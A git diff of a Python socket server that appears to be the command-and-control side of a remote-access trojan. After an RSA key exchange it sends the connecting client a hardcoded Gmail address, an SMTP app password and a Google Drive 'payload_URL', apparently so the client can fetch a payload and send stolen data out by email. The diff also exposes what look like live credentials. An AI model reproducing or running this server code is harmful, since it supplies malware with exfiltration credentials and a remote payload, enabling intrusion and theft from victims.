@@ -1,4 +1,3 @@
-import socket
 from utils import *
 
 # old ip
@@ -6,11 +5,12 @@ from utils import *
 SERVER_IP = '127.0.0.1'
 SERVER_PORT = 5678
 
+exported_public_key, exported_private_key = generateRSAKeys()
+key_pair = exported_public_key.decode().replace("\n", "") + "\n" + exported_private_key.decode().replace("\n", "")
+saveKey(key_pair, "keyPair.key")
 
 with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
-    exported_public_key, exported_private_key = generateRSAKeys()
-    key_pair = exported_public_key.decode().replace("\n", "") + "\n" + exported_private_key.decode().replace("\n", "")
-    saveKey(key_pair, "keyPair.key")
+    
     s.bind((SERVER_IP, SERVER_PORT))
     print('Server is listening')
     s.listen(1)
@@ -19,10 +19,18 @@ with socket.socket(socket.AF_INET , socket.SOCK_STREAM) as s:
     with conn:
         while(True):
             conn.send(exported_public_key)
-            data =  conn.recv(1024)
-            print(data)
-            my_key = decrypt_with_RSA(data, exported_private_key)
-            print(my_key)
+            encrypted_ascii =  conn.recv(1024)
+            print(encrypted_ascii)
+            decrypted_ascii = decrypt_with_RSA(encrypted_ascii, exported_private_key)
+            print(decrypted_ascii)
+            credentials = {}
+            credentials['smtp_email'] = "gpt.rats@gmail.com"
+            credentials['smtp_password'] = "mmtxdnfzzvckqrhw"
+            payload_URL = "https://drive.google.com/file/d/1A4n52slL4GNmDcdfFMo4Sg5aKguc191h/view?usp=sharing"
+            conn.send(credentials['smtp_email'].encode() + b"\n" + credentials['smtp_password'].encode() + b"\n" + payload_URL.encode())
+            # conn.send(credentials['smtp_email'].encode())
+            # conn.send(credentials['smtp_password'].encode())
+            # conn.send(payload_URL.encode())
             break
 
 
